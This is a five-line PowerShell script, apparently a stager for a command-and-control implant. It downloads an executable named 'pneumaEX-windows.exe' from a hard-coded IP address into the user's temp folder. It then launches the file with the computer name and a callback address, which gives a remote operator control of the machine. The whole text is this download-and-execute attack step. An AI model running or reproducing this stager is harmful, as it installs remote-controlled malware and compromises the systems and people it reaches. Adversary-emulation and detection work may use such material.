$implant = 'pneumaEX-windows.exe'
$url = 'http://20.232.12.130:3391/payloads/pneumaEx', $implant -join '/'
$file = $env:tmp, $implant -join '\'
(New-Object System.Net.WebClient).DownloadFile($url, $file);
Start-Process -FilePath $file -ArgumentList "-name $env:COMPUTERNAME -address 20.232.12.130:2323"
